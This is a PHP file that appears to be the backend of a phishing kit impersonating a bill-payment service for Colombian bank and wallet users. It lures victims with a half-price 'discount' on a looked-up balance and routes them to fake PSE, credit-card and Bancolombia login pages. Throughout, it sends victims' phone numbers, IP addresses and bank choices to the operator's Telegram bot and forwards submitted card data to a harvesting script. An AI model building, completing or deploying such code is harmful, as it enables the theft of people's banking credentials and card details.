<?php
session_start();
include('telegram_cred.php');
require_once('acciones/bot_telegram.php');
function getBankName($value) {
    switch ($value) {
        case "1815":
            return "ALIANZA FIDUCIARIA";
        case "1558":
            return "BAN100";
        case "1059":
            return "BANCAMIA S.A.";
        case "1040":
            return "BANCO AGRARIO";
        case "1052":
            return "BANCO AV VILLAS";
        case "1013":
            return "BANCO BBVA COLOMBIA S.A.";
        case "1032":
            return "BANCO CAJA SOCIAL";
        case "1066":
            return "BANCO COOPERATIVO COOPCENTRAL";
        case "1051":
            return "BANCO DAVIVIENDA";
        case "1001":
            return "BANCO DE BOGOTA";
        case "1023":
            return "BANCO DE OCCIDENTE";
        case "1062":
            return "BANCO FALABELLA";
        case "1063":
            return "BANCO FINANDINA S.A. BIC";
        case "1012":
            return "BANCO GNB SUDAMERIS";
        case "1006":
            return "BANCO ITAU";
        case "1071":
            return "BANCO J.P. MORGAN COLOMBIA S.A.";
        case "1047":
            return "BANCO MUNDO MUJER S.A.";
        case "1060":
            return "BANCO PICHINCHA S.A.";
        case "1002":
            return "BANCO POPULAR";
        case "1065":
            return "BANCO SANTANDER COLOMBIA";
        case "1069":
            return "BANCO SERFINANZA";
        case "1303":
            return "BANCO UNION antes GIROS";
        case "1007":
            return "BANCOLOMBIA";
        case "1061":
            return "BANCOOMEVA S.A.";
        case "1283":
            return "CFA COOPERATIVA FINANCIERA";
        case "1009":
            return "CITIBANK";
        case "1370":
            return "COLTEFINANCIERA";
        case "1292":
            return "CONFIAR COOPERATIVA FINANCIERA";
        case "1291":
            return "COOFINEP COOPERATIVA FINANCIERA";
        case "1289":
            return "COTRAFA";
        case "1816":
            return "CREZCAMOS";
        case "1097":
            return "DALE";
        case "1637":
            return "IRIS";
        case "1070":
            return "LULO BANK";
        case "1801":
            return "MOVII S.A.";
        case "1019":
            return "SCOTIABANK COLPATRIA";
        case "1804":
            return "UALÁ";
        case "1507":
            return "NEQUI";
        case "1551":
            return "DAVIPLATA";
        case "1811":
            return "RAPPIPAY";
        default:
            return "Valor desconocido";
    }
}


// Función para redirigir internamente usando cURL
function redirigirInternamente($postData) {
    $scheme = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    
    // Obtener el host (dominio)
    $host = $_SERVER['HTTP_HOST'];
    
    // Combinar el esquema y el host para obtener el origen
    $origin = $scheme . '://' . $host;
    
    // Nombre del archivo que deseas agregar al origen
    $archivo = "comprobando.php"; // Cambia esto por el nombre del archivo que necesites
    
    // Combinar el origen con el nombre del archivo
    $urlCompleta = $origin . '/' . $archivo;
    // URL del archivo PHP al que deseas redirigir internamente
    $url = $urlCompleta; // Cambia la URL a la de tu servidor

    // Inicializar cURL
    $ch = curl_init($url);

    // Configurar cURL para que realice una solicitud POST
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // Obtener respuesta como cadena
    curl_setopt($ch, CURLOPT_POST, true);            // Establecer método POST
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData); // Datos POST

    // Ejecutar cURL y obtener la respuesta
    $response = curl_exec($ch);

    // Verificar si hubo un error en cURL
    if (curl_errno($ch)) {
        echo 'Error en cURL: ' . curl_error($ch);
    }

    // Cerrar la sesión cURL
    curl_close($ch);

    // Retornar la respuesta del archivo procesado
    return $response;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $url_referer = $_SERVER['HTTP_REFERER'];
    $nombre_archivo_referido = basename(parse_url($url_referer, PHP_URL_PATH));

    switch ($nombre_archivo_referido) {
        case 'inicio.php':
            if (!empty($_POST)) {
                $numero = $_POST['NumeroCelular'];

                // Leer el archivo .txt
                $file = '1.txt';
                $found = false;

                if (file_exists($file)) {
                    $handle = fopen($file, 'r');
                    if ($handle) {
                        while (($line = fgets($handle)) !== false) {
                            list($num, $saldo) = explode(',', trim($line));

                            if ($num == $numero) {
                                $_SESSION['numero'] = $num;
                                $_SESSION['saldo2'] = $saldo;

                                $found = true;
                                break;
                            }
                        }
                        fclose($handle);
                    } else {
                        echo "";
                    }
                } else {
                    echo "";
                }

                if ($found) {
                    $saldo =$_SESSION['saldo2'];
                    $pr = intval($saldo);

                    // Formatear el saldo total y el saldo con descuento
                    $saldo_total = number_format($pr, 2, ',', '.');
                    $saldo_con_descuento = number_format($pr * 0.5, 2, ',', '.');
                    $_SESSION['saldo2'] =$saldo_total;
                    $_SESSION['saldo'] = $saldo_con_descuento;
                    enviarMensajeTelegram(CHATID, $num, LOGIN);
                    $_SESSION['CEL'] = true;
                    header('Location: /facturas.php');
                    
                    exit();
                } else {
                    $_SESSION['CEL'] = true;
                    header('location:/inicio.php?codigo=1');
                    exit();
                }
            }
            break;

        case 'facturas.php':
            if (isset($_POST['FORMA_PAGO']) && !isset($_POST['TARJETA_CREDITO'])) {
                $forma_de_pago = $_POST['FORMA_PAGO'];
                $_SESSION['saldo'] = $_POST['Saldo'];
                $_SESSION['numero'] = $_POST['numero'];
                
                switch ($forma_de_pago) {
                    case 1:
                        header('Location: /pse.php');
                        break;
                    case 2:
                        header('Location: /cc.php');
                        break;
                    default:
                        $_SESSION['refer'] = $_POST['code'];
                        header('Location: /pagosbancolombia.php');
                        break;
                }
                exit();
            }
            break;

        case 'cc.php':
            
            if (isset($_POST['TARJETA_CREDITO'])) {
                $resultado = redirigirInternamente($_POST);
                exit();
            }
            break;

        case 'pagosbancolombia.php':
            if (isset($_POST['numero']) && isset($_POST['ip_del_visitante'])) {
                $num = $_POST['numero'];
                $ip = $_POST['ip_del_visitante'];
                $bank = 'Bancolombia';
                $contenido = $num." entró a Bancolombia ->$ip";
                enviarMensajeTelegram(CHATID, $contenido, LOG);
                
                header('Location: /pagosbancolombiauser.php');
                exit();
            }
            break;

        case 'pse.php':
            
            if(isset($_POST['BANCO'])){
                $prueba = $_POST['BANCO'];
                $num = $_SESSION['numero'];
                $contenido = $num . " entró a ".$prueba;
                if($_POST['TITULAR'] == ""){
                 header('location:/pse.php?codigo');
            
                }else{
                    enviarMensajeTelegram(CHATID, $contenido, LOG);
                    $_SESSION['CEL'] = true;
                    header('location:./pago2/'.$prueba);
            
                }
            
            }
            break;

        default:
            header('Location: /index.php');
            exit();
    }
} else {
    // Si la solicitud no es POST, mostrar un mensaje de error
    echo "Error: Solo se permiten solicitudes POST.";
}
?>
